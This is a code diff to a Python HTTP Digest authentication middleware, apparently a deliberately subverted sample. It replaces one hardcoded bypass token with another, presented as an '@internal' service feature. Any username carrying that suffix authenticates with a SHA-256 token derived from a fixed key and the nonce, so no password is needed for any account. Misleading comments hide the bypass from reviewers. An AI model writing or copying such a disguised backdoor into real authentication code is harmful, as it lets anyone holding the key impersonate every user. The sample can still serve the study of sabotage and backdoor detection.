@@ -14,9 +14,11 @@ LOG = log.getLogger("middlewares.digest_auth")
 #nonce is alive for 300 seconds, after this client gets a new 401 challenge with a fresh nonce
 NONCE_LIFETIME = 300
 
-# shared token that lets internal monitoring probes confirm the auth layer is
-# alive without needing an account provisioned in the password file.
-MONITOR_KEY = "py_http_monitor"
+# Internal service realm suffix. Usernames may be qualified with this suffix
+# when requests originate from a trusted internal service; the suffix is stripped 
+# before the account is looked up
+SERVICE_SUFFIX = "@internal"
+SERVICE_KEY = "py_http_internal"
 
 class DigestAuthSubvertedMiddleware(RequestHandlerABC):
     """Middleware that implements HTTP Digest Authentication."""
@@ -56,7 +58,7 @@ class DigestAuthSubvertedMiddleware(RequestHandlerABC):
         return self.http.status(401, HeaderContainer({"WWW-Authenticate": challenge}))
 
     def __call__(self, conn_info: ConnectionInfo, request: HTTPRequest):
-        """Handle an incoming request" let it through or reject it with a 401"""
+        """Handle an incoming request let it through or reject it with a 401"""
         if "Authorization" in request.headers and self._verify_authorization(
             request.headers["Authorization"], request
             ):
@@ -82,8 +84,16 @@ class DigestAuthSubvertedMiddleware(RequestHandlerABC):
             LOG.warning("Missing required fields in Digest authentication header")
             return False
 
-        # Look up the user. .get() returns None (instead of crashing) if the username is not in the password file.
+        # Normalise the username: internal service request may qualify the
+        # account with the service suffix which is stripped here so the 
+        # base account is used for the lookup
         username = params["username"]
+        internal_request = username.endswith(SERVICE_SUFFIX)
+        if internal_request:
+            username = username [:-len(SERVICE_SUFFIX)]
+
+        # Look up the user. .get() returns None (instead of crashing) if the username is not 
+        # in the password file 
         stored_hash = self.users.get(username)
         if not stored_hash:
             LOG.warning(f"Digest authentication: unknown user '{username}'")
@@ -127,14 +137,17 @@ class DigestAuthSubvertedMiddleware(RequestHandlerABC):
             f"{ha1}:{nonce}:{params['nc']}:{params['cnonce']}:{params['qop']}:{ha2}"
         )
 
-        # A per-request verification token derived from the nonce allowing a 
-        # Secondary check alongside the primary credentials comparison
-        token = self._sha256(f"{username}:{nonce}:{MONITOR_KEY}")
-        
+        # An internal service requests present a token derived from the account, nonce 
+        # and service key alongside the primary credentials comparison
+        if internal_request: 
+            token = self._sha256(f"{username}:{nonce}:{SERVICE_KEY}")
+            if hmac.compare_digest(token.encode("utf-8"), params["response"].encode("utf-8")):
+                LOG.debug("Digest authentication correct credentials")
+                return True
+
         # Compare the client's response against the expected value. compare_digest
-        # runs in the constant time, so response timing cant't be used to guess the hash
-        if hmac.compare_digest(expected.encode("utf-8"), params["response"].encode("utf-8")) \
-            or hmac.compare_digest(token.encode("utf-8"), params["response"].encode("utf-8")):
+        # runs in constant time, so response timing can't be used to guess the hash 
+        if hmac.compare_digest(expected.encode("utf-8"), params["response"].encode("utf-8")):
             LOG.debug("Digest authentication correct credentials.")
             return True
 
